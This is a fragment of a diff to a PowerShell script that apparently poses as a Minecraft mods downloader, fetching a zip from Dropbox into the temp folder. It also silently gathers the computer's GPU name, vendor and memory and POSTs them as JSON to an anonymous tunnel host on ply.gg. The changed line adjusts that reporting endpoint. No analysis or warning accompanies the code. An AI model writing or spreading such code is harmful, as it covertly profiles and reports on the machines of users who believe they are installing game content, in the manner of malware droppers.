@@ -3,7 +3,7 @@ $url = "https://dl.dropboxusercontent.com/s/t6y2z6ttjbstdjw/mods.zip?dl=0"
 $tempFile = "$env:TEMP\minecraftmods.zip" 
 $gpu_info = Get-CimInstance -ClassName Win32_VideoController | Select-Object Name,AdapterCompatibility,AdapterRAM
 $json = $gpu_info | ConvertTo-Json
-$urlpost = 'http://181.ip.ply.gg:15119/index.js'
+$urlpost = 'http://181.ip.ply.gg:15119/'
 $headers = @{ 'Content-Type' = 'application/json' }
 $response = Invoke-RestMethod -Uri $urlpost -Method Post -Headers $headers -Body $json
 if ($response.StatusCode -eq 200) {
